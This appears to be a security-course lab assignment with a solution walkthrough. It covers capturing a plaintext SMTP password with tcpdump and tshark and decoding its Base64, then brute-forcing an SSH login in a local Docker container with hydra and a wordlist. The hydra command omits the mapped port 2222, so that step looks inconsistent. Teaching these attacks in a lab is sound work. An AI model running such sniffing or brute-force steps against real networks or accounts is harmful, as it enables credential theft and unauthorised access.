Tasks
0. ARP spoofing and sniffing unencrypted traffic
#advanced


Security is a vast topic, and network security is an important part of it. A lot of very sensitive information goes over networks that are used by many people, and some people might have bad intentions. Traffic going through a network can be intercepted by a malicious machine pretending to be another network device. Once the traffic is redirected to the malicious machine, the hacker can keep a copy of it and analyze it for potential interesting information. It is important to note that the traffic must then be forwarded to the actual device it was supposed to go (so that users and the system keep going as if nothing happened).

Any information that is not encrypted and sniffed by an attacker can be seen by the attacker - that could be your email password or credit card information. While today’s network security is much stronger than it used to be, there are still some legacy systems that are using unencrypted communication means. A popular one is telnet.

In this project, we will not go over ARP spoofing, but we’ll start by sniffing unencrypted traffic and getting information out of it.

Sendgrid offers is an emailing service that provides state of the art secure system to send emails, but also supports a legacy unsecured way: telnet. You can create an account for free, which is what I did, and send an email using telnet:

sylvain@ubuntu$ telnet smtp.sendgrid.net 587
Trying 167.89.121.145...
Connected to smtp.sendgrid.net.
Escape character is '^]'.
220 SG ESMTP service ready at ismtpd0013p1las1.sendgrid.net
EHLO ismtpd0013p1las1.sendgrid.net
250-smtp.sendgrid.net
250-8BITMIME
250-PIPELINING
250-SIZE 31457280
250-STARTTLS
250-AUTH PLAIN LOGIN
250 AUTH=PLAIN LOGIN
auth login           
334 VXNlcm5hbWU6
VGhpcyBpcyBteSBsb2dpbg==
334 UGFzc3dvcmQ6
WW91IHJlYWxseSB0aG91Z2h0IEkgd291bGQgbGV0IG15IHBhc3N3b3JkIGhlcmU/ISA6RA==
235 Authentication successful
mail from: sylvain@kalache.fr
250 Sender address accepted
rcpt to: julien@google.com
250 Recipient address accepted
data
354 Continue
To: Julien
From: Sylvain
Subject: Hello from the insecure world

I am sending you this email from a Terminal.
.
250 Ok: queued as Aq1zhMM3QYeEprixUiFYNg
quit
221 See you later
Connection closed by foreign host.
sylvain@ubuntu$ 
I wrote the script user_authenticating_into_server that performs the authentication steps that I just showed above. Your mission is to execute user_authenticating_into_server locally on your machine and, using tcpdump, sniff the network to find my password. Once you find it, paste the password in your answer file. This script will not work on a Docker container or Mac OS, use your Ubuntu vagrant machine or any other Linux machine.

You can download the script user_authenticating_into_server here

DISCLAIMER: you will probably see Authentication failed: Bad username / password in the tcpdump trace. It’s normal, we deleted the user to our Sendgrid account. You can’t verify the password found via Sendgrid, only the correction system can!

Repo:

GitHub repository: alx-system_engineering-devops
Directory: attack_is_the_best_defense
File: 0-sniffing
  
1. Dictionary attack
#advanced
Password-based authentication systems can be easily broken by using a dictionary attack (you’ll have to find your own password dictionary). Let’s try it on an SSH account.

Install Docker on your machine Ubuntu
Pull and run the Docker image sylvainkalache/264-1 with the command docker run -p 2222:22 -d -ti sylvainkalache/264-1
Find a password dictionary (you might need multiple of them)
Install and use hydra to try to brute force the account sylvain via SSH on the Docker container
Because the Docker container is running locally, hydra should access the SSH account via IP 127.0.0.1 and port 2222
Hint: the password is 11 characters long
Once you found the password, share it in your answer file.

Repo:

GitHub repository: alx-system_engineering-devops
Directory: attack_is_the_best_defense
File: 1-dictionary_attack












## **PROCEDURES OF BOTH TASKS**


Task 0: ARP Spoofing and Sniffing Unencrypted Traffic
Prerequisites
Before proceeding, ensure you have the required tools installed:

Download the Program:

Download the provided program:
curl -O https://s3.amazonaws.com/intranet-projects-files/holbertonschool-sysadmin_devops/264/user_authenticating_into_server
Install tcpdump:

Update your package list:
sudo apt-get update
Install tcpdump:
sudo apt-get install tcpdump
Install tshark:

Install tshark for more human-readable output:
sudo apt install tshark
Intercepting Data
Now you're ready to intercept data between the user_authenticating_into_server program and the SendGrid server.

Run tcpdump:

Execute the following command to capture network traffic:
sudo tcpdump -i eth0 -n -s 0 -A 'host smtp.sendgrid.net and port 587' -w sendgrid_traffic.pcap
-i eth0: Replace eth0 with the network interface your program uses.
-n: Display numeric IP addresses and port numbers instead of resolving hostnames and services.
-s 0: Capture the entire packet.
-A: Display packet data (payload) in ASCII format.
'host smtp.sendgrid.net and port 587': Capture traffic to and from SendGrid's SMTP server on port 587.
-w sendgrid_traffic.pcap: Save captured packets to a file for later analysis.
Run Your Program:

In a second Ubuntu terminal, give permission and then run your program:
sudo chmod +x user_authenticating_into_server
sudo ./user_authenticating_into_server
Capture and Analyze:

Wait for your program to execute, then interrupt the first terminal using CTRL-C.
You'll have a sendgrid_traffic.pcap file that you can analyze.
Analyzing the Capture
You can analyze the capture file using either tcpdump or tshark:

Using tcpdump:

tcpdump -r sendgrid_traffic.pcap
Using tshark for more human-readable output:

15 3.999733 172.31.145.221 → 54.228.39.88 SMTP 80 C: User: bXlsb2dpbg==
16 4.069955 54.228.39.88 → 172.31.145.221 TCP 66 587 → 57152 [ACK] Seq=196 Ack=63 Win=32256 Len=0 TSval=2327286244 TSecr=1468075274
17 4.069956 54.228.39.88 → 172.31.145.221 SMTP 84 S: 334 UGFzc3dvcmQ6
18 4.070087 172.31.145.221 → 54.228.39.88 TCP 66 57152 → 587 [ACK] Seq=63 Ack=214 Win=64128 Len=0 TSval=1468075345 TSecr=2327286244
19 6.001628 172.31.145.221 → 54.228.39.88 SMTP 88 C: Pass: bXlwYXNzd29yZDk4OTgh
This part of the output shows the authentication process with the information:

User: bXlsb2dpbg==

Pass: bXlwYXNzd29yZDk4OTgh

Credentials are Base64 encoded, so the decoded information would be:

User: mylogin

Pass: mypassword9898!

Task 1: Dictionary Attack
Performing a dictionary attack using Hydra to guess a password for an SSH account.

Prerequisites
Docker: Install Docker
Setup
Pull and run the Docker image sylvainkalache/264-1 with the following command:

docker run -p 2222:22 -d -ti sylvainkalache/264-1
Start the Docker container by replacing <container_id> with the ID of the newly created sylvainkalache/264-1 container:

docker start -ai <container_id>
Install Hydra:

sudo apt-get install hydra
Download a potential password list in .txt format. You can find one in the SecLists library.

To save time and resources, isolate passwords with 11 characters from your password list:

grep -oE '\b\w{11}\b' all_passwords.txt > 11_char_passwords.txt
Running the Attack
Run Hydra with the specified requirements:

hydra -l sylvain -P 11_char_passwords.txt ssh://127.0.0.1
-l sylvain: Specifies the target username as "sylvain." This is the username for which you are attempting to guess the password.

-P 11_char_passwords.txt: Specifies the password list or wordlist you are using for the attack. In this case, the wordlist contains passwords with 11 characters. Hydra will try each password from this list in an attempt to gain access to the SSH service.

ssh://127.0.0.1: Specifies the target SSH service running on the local host (127.0.0.1). Hydra will attempt to log in to this SSH service using the provided username and the passwords from the wordlist.

Please practice patience as hydra tries every password in the file until it finds the right one. Once successful, it will return an output similar to:

[22][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found 
